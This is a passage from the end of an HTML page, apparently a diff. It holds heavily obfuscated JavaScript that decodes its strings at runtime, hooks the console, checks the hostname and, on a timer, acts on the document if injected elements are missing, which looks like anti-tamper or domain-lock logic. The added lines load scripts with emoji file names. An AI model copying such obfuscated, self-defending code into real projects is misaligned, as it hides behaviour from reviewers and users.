aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}catch(JS$nMXs$AZMsoi){aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x184)](aivDrxhk$kGhjNzepqLWPvd[UTF$MMBycHGYrTfD_Ufh(0x190)]());}}}(_0x257e,Math.ceil(-0x2b9cb)*parseInt(0x9)+-0x2*parseFloat(-0x71c4d)+0x182df0),(function(){const fyfZe$A=sFfEkK$fMziBAJZwZbkuvp,KmkEnmSV=_0xe8c3,YYzy$XBjBwTdCwIPE$AKHEWaC=(function(){let MLfOyVBUyEPRR$$IEj=!![];return function(jeThI,ybpXPE$jfq){const vZRAXjF$_R=MLfOyVBUyEPRR$$IEj?function(){const DEQRwbJTpzvMFOryYEYKoGCD=_0xe8c3;if(ybpXPE$jfq){const vcZlz$G_trTEiNcVEYRhOyCWG=ybpXPE$jfq[DEQRwbJTpzvMFOryYEYKoGCD(Math.floor(parseInt(0x1))*-0x237b+0x5*parseInt(0x359)+parseFloat(parseInt(0x1389)))](jeThI,arguments);return ybpXPE$jfq=null,vcZlz$G_trTEiNcVEYRhOyCWG;}}:function(){};return MLfOyVBUyEPRR$$IEj=![],vZRAXjF$_R;};}()),qiwjHUauNrHLN$fg=(function(){let waQzQOaFVfq$WfrLnCpTYrDG=!![];return function(MNjbEXhItZtXPLUuC,uCZgwC$hqQ){const PsosmKTYqISIXVWY=waQzQOaFVfq$WfrLnCpTYrDG?function(){const gYLqgDXYRVUjJMRQBYU=_0xe8c3;if(uCZgwC$hqQ){const GGdBrUxKuCaWtlKW=uCZgwC$hqQ[gYLqgDXYRVUjJMRQBYU(Math.trunc(-0x2)*0x1384+parseInt(-parseInt(0x216a))+-parseInt(0x1)*-0x493d)](MNjbEXhItZtXPLUuC,arguments);return uCZgwC$hqQ=null,GGdBrUxKuCaWtlKW;}}:function(){};return waQzQOaFVfq$WfrLnCpTYrDG=![],PsosmKTYqISIXVWY;};}());let hK$kJs=![],udh_ln$z=[],bzBMId=![],YFTSa_AyznhLRB=![];function c$uljJUCGCQHFqM(hvUOLCHfCBhIT,gGA$_MNmIu){const YxGzqKLhsTvBRmcdZ=sFfEkK$fMziBAJZwZbkuvp,ALBAzExBHKkx=_0xe8c3,aOjOz$OyGi_Sw=YYzy$XBjBwTdCwIPE$AKHEWaC(this,function(){const MwJDUeTlPCUAtp_Pi$gkCn=sFfEkK$fMziBAJZwZbkuvp,S$_bpOvwP=_0xe8c3;return aOjOz$OyGi_Sw[S$_bpOvwP(Number(parseInt(0x2117))+-0x2a5+-0x1d84*Math.floor(parseInt(0x1)))]()[S$_bpOvwP(0x33a*0x1+-0xca6*0x1+-parseInt(0x518)*-0x2)](S$_bpOvwP(Math.floor(parseInt(0x1b9e))+parseFloat(-0x59b)+Number(-0x2f)*Number(0x73)))[S$_bpOvwP(Math.floor(0x2540)+Math.max(parseInt(0x1b68),0x1b68)+-0xa9f*Math.floor(parseInt(0x6)))]()[S$_bpOvwP(0x6b*parseInt(-parseInt(0xa))+Math.max(parseInt(0x2417),0x2417)+parseFloat(parseInt(0x1f21))*Number(-0x1))](aOjOz$OyGi_Sw)[S$_bpOvwP(parseFloat(-0x5c)*0x29+0x4b*0x5e+0x1*-parseInt(0xc0a))](MwJDUeTlPCUAtp_Pi$gkCn(0x1a4));});aOjOz$OyGi_Sw();const EsAEXrTkuAdPT__tKKG=qiwjHUauNrHLN$fg(this,function(){const DHKhHH$CzdaTFZpF=sFfEkK$fMziBAJZwZbkuvp,CjsPKzyFLwfe=_0xe8c3,AA_ZPkQAKRmDwqTTTdciyQE=function(){const wFmIP_BJY=_0xe8c3;let c$bSXVWQIogWemFKiw;try{c$bSXVWQIogWemFKiw=Function(wFmIP_BJY(-parseInt(0x11b5)*-parseInt(0x1)+-0x1*-0x7bb+parseFloat(-0x1890))+wFmIP_BJY(Math.trunc(-parseInt(0x31))*-parseInt(0x46)+parseInt(0x34)+Math.trunc(-0xcb8)*parseInt(0x1))+');')();}catch(Gb_ACKNijqUcdVRCDBcMcF){c$bSXVWQIogWemFKiw=window;}return c$bSXVWQIogWemFKiw;},Vkmv$yFSRdHrKoQ=AA_ZPkQAKRmDwqTTTdciyQE(),utUNAf_YOnudTwxsFQFYNVLTF=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.floor(-0x1d5)*-parseInt(0x11)+Math.floor(-0xd)*parseInt(0x13b)+0x1*Math.max(-0xe39,-0xe39))]=Vkmv$yFSRdHrKoQ[CjsPKzyFLwfe(Math.max(-0x1ba4,-0x1ba4)+parseInt(0xbe)*Math.max(-parseInt(0xd),-parseInt(0xd))+parseInt(0x2637))]||{},ub_IKGtkVJnrm=[DHKhHH$CzdaTFZpF(0x1b4),CjsPKzyFLwfe(-parseInt(0x75c)+-0x3d*parseInt(0x30)+parseInt(0x1396)),CjsPKzyFLwfe(Math.floor(-parseInt(0xcf6))+parseFloat(-0x18)*parseInt(-parseInt(0x59))+Math.ceil(0x57f)),CjsPKzyFLwfe(0xa86+Number(-parseInt(0x585))+-0x43a),CjsPKzyFLwfe(0x1f9+parseInt(0x2)*-0xd5+Math.floor(-parseInt(0x4))*Number(-0x25)),CjsPKzyFLwfe(Math.floor(-0x18f1)+0x4b7+parseInt(0x150b)),CjsPKzyFLwfe(0x1a5*0x1+parseInt(0x352)+parseInt(0x29)*parseInt(-parseInt(0x1a)))];for(let FNmbuOKunHKDQnEd=parseInt(0x5)*0x2f1+Math.max(parseInt(0x1d8f),0x1d8f)*-parseInt(0x1)+0xeda;FNmbuOKunHKDQnEd<ub_IKGtkVJnrm[CjsPKzyFLwfe(-0xe40+-0x65*Math.floor(0x24)+parseInt(0x1d4f))];FNmbuOKunHKDQnEd++){const ksLNxwdrpBft=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(-parseInt(0x1b30)+Math.trunc(parseInt(0x25da))+parseInt(0xfd)*-0xa)][CjsPKzyFLwfe(-0x1540+-parseInt(0x1564)+-0x2b82*Math.ceil(-parseInt(0x1)))][CjsPKzyFLwfe(Math.ceil(-parseInt(0x49))*-0x58+Math.max(-parseInt(0x66),-parseInt(0x66))*parseInt(0x25)+-0x3*0x32b)](qiwjHUauNrHLN$fg),TbeQm$$iDqjMKpTtSlnEF=ub_IKGtkVJnrm[FNmbuOKunHKDQnEd],PCdCtHVuQ$WZinsEonTDhRHx=utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]||ksLNxwdrpBft;ksLNxwdrpBft[CjsPKzyFLwfe(parseInt(0x1f25)+0x9*-parseInt(0x349)+Math.ceil(-parseInt(0xbf)))]=qiwjHUauNrHLN$fg[CjsPKzyFLwfe(Math.ceil(-parseInt(0x27))*Math.max(-parseInt(0x38),-0x38)+Math.trunc(0x874)+parseFloat(parseInt(0x1))*Math.trunc(-parseInt(0x1023)))](qiwjHUauNrHLN$fg),ksLNxwdrpBft[DHKhHH$CzdaTFZpF(0x1b9)]=PCdCtHVuQ$WZinsEonTDhRHx[CjsPKzyFLwfe(parseInt(0xf84)+Number(-parseInt(0xa8b))*0x2+0x680)][CjsPKzyFLwfe(Math.floor(-0x2)*-parseInt(0x81b)+parseInt(0x144c)+parseInt(0x23a9)*Math.trunc(-0x1))](PCdCtHVuQ$WZinsEonTDhRHx),utUNAf_YOnudTwxsFQFYNVLTF[TbeQm$$iDqjMKpTtSlnEF]=ksLNxwdrpBft;}});EsAEXrTkuAdPT__tKKG(),udh_ln$z[YxGzqKLhsTvBRmcdZ(0x184)](hvUOLCHfCBhIT);let ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x18c)](hvUOLCHfCBhIT);!ZZlEfnTJFgKrlZQ&&(ZZlEfnTJFgKrlZQ=document[YxGzqKLhsTvBRmcdZ(0x1b1)](ALBAzExBHKkx(0x27*0x14+parseInt(0x1902)+-parseInt(0x36)*parseInt(0x81))),ZZlEfnTJFgKrlZQ['id']=hvUOLCHfCBhIT,document[ALBAzExBHKkx(parseFloat(-0x18ce)+-0x462+-parseInt(0xf0)*-0x20)][ALBAzExBHKkx(-parseInt(0x3)*Math.trunc(0x471)+Number(parseInt(0x247c))+Math.max(-parseInt(0x5),-parseInt(0x5))*parseInt(0x477))](ZZlEfnTJFgKrlZQ));const JusV_APG$gjSZYfdHqhYsOfh=document[ALBAzExBHKkx(-parseInt(0x749)+Math.ceil(-parseInt(0x25f4))+parseInt(0x2e11))](ALBAzExBHKkx(parseInt(parseInt(0x214c))+0x1afe+-0x1*Number(parseInt(0x3b73))));JusV_APG$gjSZYfdHqhYsOfh[ALBAzExBHKkx(-0x281*Number(0xa)+0x1*0x153b+Math.trunc(0x491))]=ALBAzExBHKkx(0x6*parseInt(0x350)+0x236+Math.floor(-0x11d)*parseInt(0x13)),ZZlEfnTJFgKrlZQ[ALBAzExBHKkx(parseInt(0x1347)+parseInt(0x3)*Number(-0x9b)+-parseInt(0x10a0))](JusV_APG$gjSZYfdHqhYsOfh),gGA$_MNmIu===Math[YxGzqKLhsTvBRmcdZ(0x186)](-parseInt(0x5)*parseFloat(-parseInt(0x21e))+Math.ceil(-0xf)*-0x250+Math.floor(0x2d42)*-0x1)*-(Math.max(-0x989,-0x989)+Math.ceil(-0x44e)+parseInt(-parseInt(0x2))*-0x840)+parseInt(Math.ceil(0x1)*Math.max(0xd53,parseInt(0xd53))+-parseInt(0x1df5)*Number(-0x1)+Math.ceil(-parseInt(0x6a))*parseInt(0x20))+parseFloat(-parseInt(Math.trunc(-parseInt(0x1))*parseInt(0x144f)+Math.ceil(0x2d)*-0xb3+Math.trunc(parseInt(0x1))*parseInt(0x368b)))*(parseInt(0x2bb)+parseInt(0x6e3)+-parseInt(0x1eb)*Math.max(parseInt(0x5),parseInt(0x5)))?bzBMId=!![]:YFTSa_AyznhLRB=!![];}function IuySzzpOiISwZDDrwmF(){const TJjv$_TBBMK=sFfEkK$fMziBAJZwZbkuvp,wRFucCDOfu$LtCMXVPgy=_0xe8c3,k_l_ellCISKwd=location[wRFucCDOfu$LtCMXVPgy(Math.floor(0x11)*parseFloat(-parseInt(0x9e))+Math.floor(-parseInt(0x2194))+parseInt(0x4)*parseInt(0xb36))];return k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(parseInt(0x1)*Math.ceil(parseInt(0x265))+parseInt(0x5)*0x69e+-0x22b2)||k_l_ellCISKwd===wRFucCDOfu$LtCMXVPgy(0x7*-0x53f+Math.floor(-0x1)*parseInt(0x2351)+0x48cb*parseInt(parseInt(0x1)))||location[wRFucCDOfu$LtCMXVPgy(parseInt(0x2133)+parseInt(0x4b6)+-0x3*parseInt(0xc5f))][TJjv$_TBBMK(0x1b5)](TJjv$_TBBMK(0x19f));}c$uljJUCGCQHFqM(crypto[KmkEnmSV(-0x7a*-parseInt(0x13)+parseInt(0x1f8b)+-0x257*parseInt(0x11))]()[KmkEnmSV(parseFloat(-0x1076)+Math.ceil(parseInt(0x1d3))*Math.max(0x2,0x2)+parseFloat(0xdba))]('-',''),parseInt(0x1*parseInt(-parseInt(0x270a))+0x1*-0x4ff+parseInt(0x43b8))+(Math.ceil(-parseInt(0xc7d))*-parseInt(0x1)+Math.floor(-parseInt(0x18e5))+0x1e00)+parseInt(-(0x49aa+0x163*parseInt(0x29)+-0x593f))),c$uljJUCGCQHFqM(crypto[fyfZe$A(0x18b)]()[fyfZe$A(0x19c)]('-',''),Math[KmkEnmSV(0x1250+-0x19f0+Math.max(0x887,parseInt(0x887)))](-(0x85d*-0x1+-parseInt(0x25ce)*-0x1+-parseInt(0x3ae)*parseInt(0x8)))*(0x9*parseFloat(parseInt(0x405))+parseInt(0x106)*-0x17+-parseInt(0xc70))+-parseInt(parseInt(0xbfa)+parseInt(0x1c)*0x29c+-0x1*Math.trunc(parseInt(0x3077)))+Math[KmkEnmSV(Math.floor(parseInt(0x34d))+parseInt(0x61)*-0x5f+parseInt(0x2180))](-(-0x13ff+parseInt(-0x765)+0x1ffd))*-(parseInt(0x213b)+parseFloat(-0x1e65)*parseInt(-parseInt(0x1))+Math.floor(parseInt(0x25))*-0x1b8));let cDI_LjPiksLv$sA=setInterval(()=>{const wAfptqBlmnOZ=fyfZe$A,gcJTS=KmkEnmSV;hK$kJs&&clearInterval(cDI_LjPiksLv$sA);for(let DwEqUVjz_qHgd_omhiKOFelRy=-parseInt(-parseInt(0x2286)+parseInt(parseInt(0x60d))*-0x2+parseInt(0x2f30))+Math[wAfptqBlmnOZ(0x196)](-parseInt(0xe05)*-0x2+Number(-0x6c9)*Math.floor(0x5)+parseInt(0x1d4)*0xb)*(Math.trunc(0x17)*-parseInt(0x86)+parseInt(0x9a)+Math.ceil(0xb72))+-parseInt(Math.max(parseInt(0x1),0x1)*-parseInt(0x2926)+-0x1d97+Number(parseInt(0x629f)));DwEqUVjz_qHgd_omhiKOFelRy<udh_ln$z[gcJTS(-parseInt(0x3d8)+Math.max(parseInt(0x86),parseInt(0x86))*Math.floor(-parseInt(0x3b))+Math.ceil(parseInt(0x2395))*Number(0x1))];DwEqUVjz_qHgd_omhiKOFelRy++){const cPPRWqXnlPOY$$cBq=udh_ln$z[DwEqUVjz_qHgd_omhiKOFelRy],Okf$w_HLhAd=document[gcJTS(Math.floor(-0x96)*-0xd+-parseInt(0x18f5)+parseFloat(parseInt(0x1b))*0xad)](cPPRWqXnlPOY$$cBq);YFTSa_AyznhLRB&&bzBMId&&(!hK$kJs&&(!Okf$w_HLhAd&&(!IuySzzpOiISwZDDrwmF()&&document[wAfptqBlmnOZ(0x1b0)][gcJTS(Math.floor(parseInt(0x995))*-0x4+Math.ceil(-0x8fe)+Math.max(0x371,0x371)*0xe)]())));}},Math[KmkEnmSV(Math.ceil(0x2615)*Math.floor(parseInt(0x1))+-parseInt(0x171f)+-parseInt(0xe31)*0x1)](-parseInt(-0x6f1*parseInt(0x7)+0x2*-0x24b3+Math.max(-parseInt(0x104),-0x104)*-parseInt(0x9e)))+(-parseInt(0x2)*0xf08+0x1baf+0xfe4)+Number(parseInt(0x1083)*Math.max(parseInt(0x1),0x1)+Math.floor(0x1e34)+-parseInt(0x11d7)));}()));function sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek){const jpcyYzd_r_c=UravPbGESYjDUNqxKcf$Vqza();return sFfEkK$fMziBAJZwZbkuvp=function(cBkxdlJOLrthNdkDJWsPnwlWD,Ew_izWDrWs$VbNMSejx){cBkxdlJOLrthNdkDJWsPnwlWD=cBkxdlJOLrthNdkDJWsPnwlWD-(parseInt(0x222d)*-parseInt(0x1)+0xbaa+Math.ceil(parseInt(0x1801)));let ZrC$BmMHQJFnM$qxVDvOaapr=jpcyYzd_r_c[cBkxdlJOLrthNdkDJWsPnwlWD];if(sFfEkK$fMziBAJZwZbkuvp['MCMlHP']===undefined){const kiHmW=function(qHLfn){let zVDPTWpEcic$l=Number(-0x7d)*parseFloat(-parseInt(0xe))+0x1b0e*Number(0x1)+parseInt(-parseInt(0xb))*0x301&Math.trunc(-parseInt(0x5))*0x1c+parseFloat(-parseInt(0x788))*parseInt(0x5)+-0x29d*-parseInt(0xf),GQloCGHmGKtLJqIIj$jnKaqx=new Uint8Array(qHLfn['match'](/.{1,2}/g)['map'](JRMexmf=>parseInt(JRMexmf,-0x1*parseInt(-0x12e)+-0xdc1*-0x1+-parseInt(0xedf)))),yzuBpRiFSFq_wPGNK=GQloCGHmGKtLJqIIj$jnKaqx['map'](Wkg_QjyPwvVREelpsnGOnwJG=>Wkg_QjyPwvVREelpsnGOnwJG^zVDPTWpEcic$l),gF$xXW$bUfgmPrkGxHtTR=new TextDecoder(),QpJsUNKKXcaFcrHADyIt=gF$xXW$bUfgmPrkGxHtTR['decode'](yzuBpRiFSFq_wPGNK);return QpJsUNKKXcaFcrHADyIt;};sFfEkK$fMziBAJZwZbkuvp['TWdYOH']=kiHmW,DgkkwGrBFCVM$xjRVLz$VfAbWhV=arguments,sFfEkK$fMziBAJZwZbkuvp['MCMlHP']=!![];}const Xtz$tyRcF_YASGBEJfRTSL=jpcyYzd_r_c[-0x961+0x7be+parseInt(0x1)*parseInt(0x1a3)],aK$Aa_l=cBkxdlJOLrthNdkDJWsPnwlWD+Xtz$tyRcF_YASGBEJfRTSL,XQHXnDh$$EY=DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l];return!XQHXnDh$$EY?(sFfEkK$fMziBAJZwZbkuvp['MbVogc']===undefined&&(sFfEkK$fMziBAJZwZbkuvp['MbVogc']=!![]),ZrC$BmMHQJFnM$qxVDvOaapr=sFfEkK$fMziBAJZwZbkuvp['TWdYOH'](ZrC$BmMHQJFnM$qxVDvOaapr),DgkkwGrBFCVM$xjRVLz$VfAbWhV[aK$Aa_l]=ZrC$BmMHQJFnM$qxVDvOaapr):ZrC$BmMHQJFnM$qxVDvOaapr=XQHXnDh$$EY,ZrC$BmMHQJFnM$qxVDvOaapr;},sFfEkK$fMziBAJZwZbkuvp(DgkkwGrBFCVM$xjRVLz$VfAbWhV,wv_xek);}function _0x257e(){const aWI$GMwS=sFfEkK$fMziBAJZwZbkuvp,uudKm=[aWI$GMwS(0x186),aWI$GMwS(0x1a1),aWI$GMwS(0x1a5),aWI$GMwS(0x199),aWI$GMwS(0x1b8),aWI$GMwS(0x19e),aWI$GMwS(0x18a),aWI$GMwS(0x1bf),aWI$GMwS(0x1a0),aWI$GMwS(0x196),aWI$GMwS(0x18d),aWI$GMwS(0x1b0),aWI$GMwS(0x17f),aWI$GMwS(0x18b),aWI$GMwS(0x1bd),aWI$GMwS(0x1b1),aWI$GMwS(0x19b),aWI$GMwS(0x1af),aWI$GMwS(0x197),aWI$GMwS(0x1ae),aWI$GMwS(0x185),aWI$GMwS(0x187),aWI$GMwS(0x1a8),aWI$GMwS(0x19a),aWI$GMwS(0x1b7),aWI$GMwS(0x1bc),aWI$GMwS(0x1a3),aWI$GMwS(0x1a2),aWI$GMwS(0x182),aWI$GMwS(0x192),aWI$GMwS(0x18e),aWI$GMwS(0x181),aWI$GMwS(0x1ab),aWI$GMwS(0x1a4),aWI$GMwS(0x1ba),aWI$GMwS(0x18c),aWI$GMwS(0x1a6),aWI$GMwS(0x19c),aWI$GMwS(0x1b3),aWI$GMwS(0x1aa),aWI$GMwS(0x194),aWI$GMwS(0x1b9),aWI$GMwS(0x1bb),aWI$GMwS(0x188),aWI$GMwS(0x1ad),aWI$GMwS(0x19d),aWI$GMwS(0x198),aWI$GMwS(0x180),aWI$GMwS(0x193)];return _0x257e=function(){return uudKm;},_0x257e();}</script></body>
+    
+    <script type="text/javascript" src="🗿.js?v=8a" charset="UTF-8"></script>
+    <script type="text/javascript" src="▶.js?v=8a" charset="UTF-8"></script>
+    <script type="text/javascript" src="💾.js?v=8a" charset="UTF-8"></script>
+</html>
